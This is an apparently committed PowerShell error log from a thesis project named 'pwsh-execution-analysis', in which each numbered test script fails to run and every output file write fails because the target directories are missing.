+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\55.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {55}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\55.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {56}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\56.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\56.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\56.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {56}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\56.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {57}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\57.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\57.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\57.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {57}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\57.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {58}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\58.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\58.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\58.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {58}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\58.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {59}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\59.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\59.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\59.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {59}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\59.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {6}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\6.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\6.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\6.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {6}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\6.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {60}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\60.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\60.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\60.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {60}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\60.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {61}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\61.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\61.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\61.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {61}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\61.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {63}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\63.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\63.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\63.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {63}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\63.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {64}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\64.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\64.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\64.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {64}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\64.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {67}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\67.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\67.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\67.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {67}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\67.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {68}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\68.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\68.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\68.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {68}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\68.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {7}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\7.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\7.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\7.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {7}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\7.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {70}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\70.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\70.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\70.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {70}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\70.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {71}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\71.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\71.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\71.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {71}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\71.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {72}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\72.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\72.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\72.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {72}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\72.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {73}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\73.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\73.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\73.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {73}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\73.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {75}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\75.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\75.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\75.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {75}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\75.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {76}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\76.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\76.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\76.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {76}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\76.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {78}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\78.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\78.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\78.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {78}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\78.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {79}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\79.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\79.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\79.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {79}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\79.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : DotNetMethodException
+
+Executing {8}: C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\8.ps1
+The argument 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\test\8.ps1' is not recognized as the name of a script file. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Out-File : Could not find a part of the path 'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\txt\8.txt'.
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:250 char:19
++ ...     $Output | Out-File -FilePath $output_file -Encoding ASCII | Out-N ...
++                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException
+    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
+
+Executed {8}
+Exception calling "Save" with "1" argument(s): "Could not find a part of the path
+'C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\output\xml\8.xml'."
+At C:\Users\unina\Desktop\tesi\pwsh-execution-analysis\exec-analysis-scripts.ps1:326 char:9
++         $xml.Save("$outdir\xml\$id_sample.xml")
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
